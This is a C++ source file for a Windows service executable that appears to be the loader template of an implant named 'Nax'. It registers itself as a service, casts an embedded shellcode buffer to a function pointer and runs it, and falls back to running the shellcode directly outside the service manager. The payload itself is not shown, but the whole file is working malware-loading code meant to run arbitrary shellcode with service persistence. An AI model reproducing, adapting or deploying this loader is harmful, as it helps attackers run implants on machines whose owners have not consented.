#include <Nax.h>
#include <Shellcode.h>

#ifndef NAX_SVC_NAME
#define NAX_SVC_NAME L"NaxService"
#endif

SERVICE_STATUS ServiceStatus = {0};
SERVICE_STATUS_HANDLE ServiceStatusHandle = NULL;
HANDLE g_StopEvent = NULL;

static wchar_t ServiceName[] = NAX_SVC_NAME;

VOID WINAPI ServiceMain( DWORD argc, LPWSTR *argv );
VOID WINAPI ServiceCtrlHandler( DWORD Ctrl );
VOID RunNax( VOID );

VOID RunNax( VOID ) {
    VOID ( *Nax )( VOID ) = ( decltype( Nax ) )Shellcode::Data;
    Nax();
}

VOID WINAPI ServiceCtrlHandler( DWORD Ctrl ) {
    switch ( Ctrl ) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus( ServiceStatusHandle, &ServiceStatus );
            SetEvent( g_StopEvent );
            return;

        case SERVICE_CONTROL_INTERROGATE:
            break;

        default:
            break;
    }

    SetServiceStatus( ServiceStatusHandle, &ServiceStatus );
}

VOID WINAPI ServiceMain( DWORD argc, LPWSTR *argv ) {

    LPCWSTR name = ( argc > 0 && argv && argv[0] ) ? argv[0] : ServiceName;
    ServiceStatusHandle = RegisterServiceCtrlHandlerW( name, ServiceCtrlHandler );

    if ( ! ServiceStatusHandle ) {
        return;
    }

    ServiceStatus.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState            = SERVICE_RUNNING;
    ServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode           = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint              = 0;
    ServiceStatus.dwWaitHint                = 0;

    SetServiceStatus( ServiceStatusHandle, &ServiceStatus );

    g_StopEvent = CreateEventW( NULL, TRUE, FALSE, NULL );
    if ( !g_StopEvent ) {
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus( ServiceStatusHandle, &ServiceStatus );
        return;
    }

    RunNax();

    WaitForSingleObject( g_StopEvent, INFINITE );
    CloseHandle( g_StopEvent );

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus( ServiceStatusHandle, &ServiceStatus );
}

auto WINAPI WinMain(
    _In_ HINSTANCE Instance,
    _In_ HINSTANCE PrevInstance,
    _In_ LPSTR     CommandLine,
    _In_ INT32     ShowCmd
) -> INT32 {
    SERVICE_TABLE_ENTRYW ServiceTable[] = { { ServiceName, ServiceMain }, { nullptr, nullptr } };

    if ( ! StartServiceCtrlDispatcherW( ServiceTable ) ) {
        RunNax();
    }

    return 0;
}

extern "C" VOID WinMainCRTStartup( VOID ) {
    INT32 ret = WinMain( NULL, NULL, NULL, 0 );
    ExitProcess( (UINT)ret );
}
